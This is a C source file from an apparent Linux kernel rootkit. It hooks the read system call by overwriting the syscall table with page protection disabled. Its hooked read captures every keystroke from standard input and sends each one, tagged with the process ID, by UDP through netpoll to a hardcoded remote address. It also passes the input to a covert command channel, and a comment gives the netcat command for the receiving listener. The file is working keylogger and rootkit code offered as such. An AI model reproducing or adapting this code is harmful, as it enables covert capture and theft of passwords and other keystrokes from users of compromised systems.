/*
 * This file contains all necessary functions for hooking and manipulating
 * the read system call. It is used as a covert communications channel as well
 * as for keylogging.
 */
#include <linux/delay.h>
#include <linux/unistd.h>
#include <linux/netpoll.h>
#include <linux/init.h>
#include <linux/sched.h>

#include "covert_communication.h"
#include "include.h"

asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);

/*
 * call counter to ensure that we are not unhooking the
 * read syste call while it is still in use
 */
static int read_call_counter = 0;
static spinlock_t read_lock;
static unsigned long read_lock_flags;

/* netpoll struct */
static struct netpoll *np = NULL;
static struct netpoll net_fill;

void init_netpoll(void)
{
	net_fill.name = "NETKEYLOG";// For log purpose 
	strlcpy(net_fill.dev_name, "eth0", IFNAMSIZ); //Works only for ethernet(type) port
	
	net_fill.local_ip.ip = htonl((unsigned long int) 0xc0a83865); //192.168.56.101 
	net_fill.local_ip.in.s_addr = htonl((unsigned long int) 0xc0a83865); 

	/* 192.168.2.4: IP of destination port 
	 * The destination must be listening: ex: nc -u -l 514 
	 */
	net_fill.remote_ip.ip = htonl((unsigned long int) 0xc0a80204); 
	net_fill.remote_ip.in.s_addr = htonl((unsigned long int) 0xc0a80204);
 
	net_fill.local_port = 6666; // some local port
	net_fill.remote_port = 514; // standard UDP port for syslog server 

	memset(net_fill.remote_mac, 0xff, ETH_ALEN); // Mac address
	netpoll_print_options(&net_fill); // To print in the log
	netpoll_setup(&net_fill);
	np = &net_fill;
} 

/* Function to send the UDP packet */
void send_udp(const char *buf)
{
	struct task_struct *task = current;
	char buf1[200];
	sprintf(buf1, "%d", task->pid);
	int len1 = strlen(buf1);
	strcpy(buf1+len1, buf);
        int len = strlen(buf);
        netpoll_send_udp(np,buf1,len1+len);
}

/*
 * Our manipulated read syscall. It will log keystrokes and serve as a covert
 * communication channel.
 */
asmlinkage long
manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
	INCREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
		
	long ret = original_read(fd, buf, count);

	if(ret >= 1 && fd == 0)
	{
		for(int i = 0; i < ret; i++) {
			char sendbuf[2];
			memcpy(sendbuf, buf+i, 1);
			memset(sendbuf+1, '\0', 1);
			send_udp(sendbuf);

			/* send to covert communication channel */
			accept_input(buf[i]);
		}
	}

	DECREASE_CALL_COUNTER(read_call_counter, &read_lock, read_lock_flags);
	return ret;
}

/* hooks the read system call */
void hook_read(void)
{
	ROOTKIT_DEBUG("Hooking read syscall...\n");
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* Init the netpoll structure */
	init_netpoll();

	/* disable write protection */
	disable_page_protection();

	/* replace the read syscall */
	original_read = (void *) sys_call_table[__NR_read];
	sys_call_table[__NR_read] = (unsigned long *) manipulated_read;

	/* reenable write protection */
	enable_page_protection();
}

/* unhooks read and returns the kernel to its regular state */
void unhook_read(void)
{
	ROOTKIT_DEBUG("Restoring original read...\n");
	
	void **sys_call_table = (void *) sysmap_sys_call_table;
	
	/* ensure that all processes have left our manipulated syscall */
	while(read_call_counter > 0) {
		//msleep(2);
	}
	spin_lock_irqsave(&read_lock, read_lock_flags);
	
	/* disable write protection */
	disable_page_protection();

	/* restore the old syscall */
	sys_call_table[__NR_read] = (unsigned long *) original_read;

	spin_unlock_irqrestore(&read_lock, read_lock_flags);

	/* reenable write protection */
	enable_page_protection();
	
	ROOTKIT_DEBUG("Done.\n");
}
